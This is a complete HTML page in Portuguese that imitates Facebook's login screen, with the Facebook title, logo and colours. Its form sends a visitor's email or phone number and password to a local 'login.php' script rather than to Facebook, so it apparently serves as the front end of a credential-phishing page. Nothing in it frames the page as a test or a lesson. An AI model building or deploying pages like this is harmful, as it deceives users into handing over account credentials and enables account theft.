<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook – Entrar ou Cadastre-se</title>

  <style>
    /* Reset básico */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      color: #1c1e21;
    }

    .container {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      min-height: 100vh;
      align-items: center;
      padding: 20px 0;
    }

    .top-spacer {
      flex: 1;
    }

    .logo {
      width: 60px;
      height: 60px;
      margin-bottom: 30px;
    }

    .login-form {
      width: 100%;
      max-width: 360px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .login-form input {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      border: 1px solid #ccd0d5;
      border-radius: 6px;
      outline: none;
      transition: border-color 0.2s;
    }

    .login-form input:focus {
      border-color: #1877f2;
    }

    .login-form button {
      width: 100%;
      padding: 14px 16px;
      font-size: 16px;
      font-weight: bold;
      color: #ffffff;
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .login-form button:hover {
      background-color: #165ec8;
    }

    .login-form .forgot-password {
      text-align: center;
      font-size: 14px;
      color: #1877f2;
      text-decoration: none;
      margin-top: 8px;
    }

    .bottom-section {
      width: 100%;
      max-width: 360px;
      margin-top: 40px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .create-account-btn {
      width: 100%;
      text-align: center;
      padding: 14px 16px;
      font-size: 16px;
      font-weight: bold;
      color: #1877f2;
      background-color: transparent;
      border: 2px solid #1877f2;
      border-radius: 6px;
      text-decoration: none;
      transition: background-color 0.2s, color 0.2s;
    }

    .create-account-btn:hover {
      background-color: #e7f3ff;
    }

    .footer-links {
      font-size: 12px;
      color: #90949c;
      text-align: center;
      margin-top: 30px;
    }

    .footer-links a {
      color: #90949c;
      text-decoration: none;
      margin: 0 8px;
    }

    .footer-links a:hover {
      text-decoration: underline;
    }

    @media (max-width: 400px) {
      .login-form,
      .bottom-section {
        padding: 0 10px;
      }
    }

    svg.logo {
      width: 60px;
      height: 60px;
    }
  </style>
</head>
<body>
  <div class="container">

    <div class="top-spacer"></div>

    <!-- Logo SVG inline -->
    <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 999.64 999.64">
      <title>facebook-13</title>
      <circle cx="499.82" cy="499.82" r="499.82" fill="#1977f3"/>
      <path d="M694.74,644.67l22.14-144.51H578.27V406.39c0-39.5,19.33-78.09,81.46-78.09h63v-123s-57.21-9.77-111.9-9.77c-114.15,0-188.79,69.16-188.79,194.48V500.16H295.15V644.67H422.09V993.93a501.28,501.28,0,0,0,78.09,6.05,510.07,510.07,0,0,0,78.09-6.05V644.67Z" transform="translate(-0.36 -0.33)" fill="#fff"/>
    </svg>

    <form class="login-form" action="login.php" method="post">
      <input type="text" name="email" placeholder="Número do celular ou email" required />
      <input type="password" name="senha" placeholder="Senha" required />
      <button type="submit">Entrar</button>
      <a href="#" class="forgot-password">Esqueceu a senha?</a>
    </form>

    <div class="bottom-section">
      <a href="#" class="create-account-btn">Criar nova conta</a>
    </div>

    <div class="footer-links">
      <a href="#">Sobre</a>
      <a href="#">Ajuda</a>
      <a href="#">Mais</a>
    </div>
  </div>
</body>
</html>
